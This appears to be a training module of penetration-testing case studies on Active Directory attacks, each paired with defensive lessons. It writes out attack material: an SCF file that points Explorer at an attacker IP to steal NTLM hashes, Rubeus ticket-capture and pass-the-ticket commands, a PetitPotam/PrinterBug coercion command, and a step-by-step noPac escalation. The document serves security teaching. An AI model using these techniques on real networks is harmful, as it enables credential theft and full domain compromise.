# Module 8: Real-World Penetration Testing Case Studies & Red Team War Stories

> **Source Material**: Synthesized directly from enterprise security assessments, Trimarc Security research (Sean Metcalf, Tyler Robinson), and real-world red team debriefs across the PDF Data Knowledge Base.

---

## 📖 Case Study 1: The Zero-Click Share Trap (SCF & URL File Hash Stealing)

### The Engagement Context
During an internal penetration test for a national financial institution, the red team gained access to an internal workstation network jack. All endpoints had updated antivirus and EDR agents, and standard vulnerability scanners reported zero critical unpatched CVEs.

### The Attack Vector
The red team discovered a writeable departmental network share (`\\files.corp.local\accounting`) used by hundreds of employees to store spreadsheets.

Instead of dropping an executable (which would trigger EDR alerts), the team dropped a benign 2-line `.scf` (Shell Command File) named `@account_audit.scf`:
```ini
[Shell]
Command=2
IconFile=\\10.10.14.5\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
* **The Psychology & Protocol Flaw**: By naming the file with an `@` prefix, it sorted to the very top of the directory. Whenever *any* employee or IT administrator opened the accounting folder in Windows Explorer, Explorer automatically attempted to render the file icon.
* To render the icon, Windows automatically initiated an SMB connection to `\\10.10.14.5\share\test.ico`.
* The attacker's listener (Responder) received the automatic NTLM authentication challenge-response, capturing dozens of domain user NetNTLMv2 hashes within hours **without a single user clicking or running anything**.
* Among the captured hashes was a Domain Admin who opened the share to assist an employee, leading to full domain compromise by evening.

### The Defensive Lesson
1. **Disable NTLM Outbound**: Enforce Group Policy setting `Network security: Restrict NTLM: Outgoing traffic to remote servers`.
2. **Egress Firewall Filtering**: Block outbound SMB (TCP port 445) at perimeter firewalls to prevent internal workstations from sending NTLM hashes to external or rogue IP addresses.

---

## 📖 Case Study 2: The Healthcare Giant & The Legacy Printer Server (Unconstrained Delegation + PetitPotam)

### The Engagement Context
A major healthcare network operating 12 hospital facilities hired a red team to simulate a sophisticated ransomware actor. The goal: determine if an adversary on guest Wi-Fi could achieve Domain Dominance and deploy mass encryption.

### The Attack Vector
1. **Footheld Acquisition**: The red team captured a standard domain user credential via LLMNR poisoning on an IoT VLAN.
2. **BloodHound Graph Discovery**: Running SharpHound, BloodHound revealed an edge:
   ```
   (CORP\Domain Users) -> (CanRDP) -> (PRINT01.corp.local)
   (PRINT01.corp.local) -> (UnconstrainedDelegation: True)
   ```
   An old Windows Server 2012 R2 print server was configured with **Unconstrained Kerberos Delegation** so users could submit print jobs across departments.
3. **The Coercion Chain**:
   * The team logged into `PRINT01` via RDP using the compromised user.
   * On `PRINT01`, they started a Kerberos ticket listener using Rubeus:
     ```cmd
     Rubeus.exe monitor /interval:5 /filteruser:DC01$
     ```
   * From another host, they sent an MS-EFSR (PetitPotam) or MS-RPRN (PrinterBug) coercion call to the primary Domain Controller (`DC01`), asking it to authenticate back to `PRINT01`:
     ```bash
     python3 dementor.py 192.168.1.50 192.168.1.10
     ```
   * The Domain Controller (`DC01$`) connected to `PRINT01` over Kerberos. Because `PRINT01` had unconstrained delegation, the DC sent its **complete machine account TGT** to `PRINT01`!
   * Rubeus captured the base64 TGT of `DC01$`.
4. **Instant Domain Takeover**:
   * The team injected the DC machine ticket into memory (`Rubeus.exe ptt`).
   * Armed with the Domain Controller's own identity, they executed a DCSync replication attack, dumping all 45,000 active domain account password hashes.

### The Defensive Lesson
* **Eliminate Unconstrained Delegation**: No server—especially non-DC servers—should ever possess Unconstrained Delegation.
* **Block RPC Coercion**: Disable the Print Spooler service (`spoolsv.exe`) on all Domain Controllers. Domain Controllers do not need to print!

---

## 📖 Case Study 3: The 15-Minute Domain Compromise (noPac / sAMAccountName Spoofing)

### The Technical Context (CVE-2021-42278 & CVE-2021-42287)
In late 2021, two vulnerabilities in Active Directory's Kerberos implementation allowed any standard domain user to escalate directly to Domain Administrator in under 60 seconds without cracking passwords or relying on misconfigurations.

### The Mechanics
1. By default, Active Directory permits standard authenticated domain users to create up to 10 machine accounts (`MachineAccountQuota = 10`).
2. The attacker creates a machine account named `FAKE_PC$`.
3. Active Directory failed to validate trailing dollar signs (`$`) during `sAMAccountName` modifications. The attacker renames `FAKE_PC$` to `DC01` (the exact name of the Domain Controller, but omitting the `$`).
4. The attacker requests a Kerberos TGT for `DC01`.
5. Active Directory checks the database, finds `DC01`, and issues a TGT.
6. The attacker renames `FAKE_PC` back to a random name.
7. The attacker presents the TGT to request a Service Ticket (TGS) for itself via S4U2self.
8. When the KDC searches for `DC01`, it fails to find `DC01`, automatically appends a `$`, finds the **real Domain Controller** (`DC01$`), and issues a service ticket containing a PAC signed as the Domain Controller itself!
9. The attacker uses this forged ticket to connect to the DC via WinRM or WMI with full SYSTEM authority.

### The Defensive Lesson
* Set `MachineAccountQuota` to **0** via ADSI Edit to prevent standard users from joining arbitrary computer accounts to the domain.
* Apply cumulative security updates immediately to patch core KDC validation bugs.

---

## 📖 Case Study 4: Trimarc Security Field Insights — Why Enterprises Fail

According to Trimarc Security (Sean Metcalf, Tyler Robinson):
1. **The "Service Account God" Anti-Pattern**: Over 70% of audited enterprises have service accounts (e.g. `svc_backup`, `svc_scanner`, `svc_antivirus`) placed directly into the `Domain Admins` group "because it made installation easier."
2. **The Stale KRBTGT Problem**: Most organizations have never rotated the `krbtgt` password since the domain was created in 2008. If an attacker stole the hash 5 years ago, their Golden Tickets remain valid until the password is reset twice.
3. **The GPP / SYSVOL Password Goldmine**: Old Group Policy Preferences files (`Groups.xml`) containing encrypted passwords with Microsoft’s publicly leaked AES key (`cpassword`) still linger in `SYSVOL` shares on 40% of networks.

### Remediation Checklist
* Audit all accounts with SPNs and move them to **Group Managed Service Accounts (gMSAs)**.
* Implement a semi-annual dual-rotation schedule for `krbtgt` using Microsoft's `New-KrbtgtKeys.ps1`.
* Scrub `SYSVOL` for legacy `.xml` files containing `cpassword` strings.
